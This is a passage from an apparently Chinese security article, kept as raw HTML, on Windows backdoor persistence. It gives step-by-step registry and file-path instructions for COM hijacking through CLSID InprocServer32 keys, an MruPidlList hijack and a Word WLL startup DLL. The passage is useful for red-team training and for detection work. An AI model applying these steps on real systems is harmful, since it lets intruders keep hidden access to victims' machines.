transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows Runtime。</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这个和<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">CRL</code>劫持<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">.NET</code>程序类似，也是通过修改<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">CLSID</code>下的注册表键值，实现对<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">CAccPropServicesClass</code>和<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">MMDeviceEnumerator</code>的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">%APPDATA%\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}\</code>下放入我们的后门<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">dll</code>，重命名为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">test._dl</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">PS：如果<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Installer</code>文件夹不存在，则依次创建<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><img class="" data-ratio="0.36613691931540343" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/28_wmKTFibRLDYWLQMS8lIRsicN7XaKFA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgRstCaUKqAbW76bjex5ricrbR5vDwmKTFibRLDYWLQMS8lIRsicN7XaKFA/640?wx_fmt=png'" data-type="png" data-w="1636"  /></code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后就是修改注册表了，在注册表位置为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKCU\Software\Classes\CLSID\</code>下创建项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>，然后再创建一个子项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">InprocServer32</code>，默认为我们的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">dll</code>文件路径：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">C:\Users\qiyou\AppData\Roaming\Microsoft\Installer\{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>，再创建一个键<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">ThreadingModel</code>，其键值为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Apartment</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><img class="" data-ratio="0.3505217925107428" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/29_NIHLc4paMSA4w8nP4ssiasOcMPYIfg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgNorJgGFZPwj6HiaDED7Gtqkic6aNIHLc4paMSA4w8nP4ssiasOcMPYIfg/640?wx_fmt=png'" data-type="png" data-w="1629"  /></code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">然后就是测试了，打开<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">iexplore.exe</code>，成功弹框</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5528103767757875" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/30_7Ms0zHBZHgdj5ZSvO17TDHxjlHxbhA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg7Rq29qk8OtafJgERceOMWwJ57Ms0zHBZHgdj5ZSvO17TDHxjlHxbhA/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">PS：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</code>对应<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">CAccPropServicesClass</code>，<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">{BCDE0395-E52F-467C-8E3D-C4579291692E}</code>对应<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">MMDeviceEnumerator</code></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">劫持MruPidlList</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在注册表位置为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKCU\Software\Classes\CLSID\</code>下创建项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">{42aedc87-2188-41fd-b9a3-0c966feabec1}</code>，再创建一个子项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">InprocServer32</code>，默认的键值为我们的dll路径，再创建一个键<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">ThreadingModel</code>，其键值：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Apartment</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><img class="" data-ratio="0.209009009009009" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/31_kQBnzKYHT4SZpRoBExViamJJMvBRfQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgCHeTiczWeW6njJejrQdVv8YW7YkQBnzKYHT4SZpRoBExViamJJMvBRfQ/640?wx_fmt=png'" data-type="png" data-w="1665"  /></code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">该注册表对应<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">COM</code>对象<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">MruPidlList</code>，作用于<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">shell32.dll</code>，而<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">shell32.dll</code>是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">explorer.exe</code>会调用<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">shell32.dll</code>，然后会加载COM对象<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">MruPidlList</code>，从而触发我们的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">dll</code>文件</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.42857142857142855" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/32_yNMBOAibFR2JCHuJZHkExlZjsbuHPQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgXnXqmbicKn1IXKrf8N7S5QsTHfyNMBOAibFR2JCHuJZHkExlZjsbuHPQ/640?wx_fmt=png'" data-type="png" data-w="1596"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">当用户重启时或者重新创建一个<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">explorer.exe</code>进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">explorer.exe</code>进程再起一个进程来看一下效果</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5528103767757875" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/33_p7YOjPQMLkRPAobic08wiavIibve1Q.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgOmS3pvjmsch1QTFUv42u2nQrMENp7YOjPQMLkRPAobic08wiavIibve1Q/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">office系列</span></h2><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Word WLL</span></h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">把dll文件保存在<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">%APPDATA%\Microsoft\Word\Startup</code>，然后把后缀名改为<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">wll</code><br  />PS：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Startup</code>支持启动多个<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">wll</code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">打开<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">word</code>，成功弹框</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.4953173777315297" 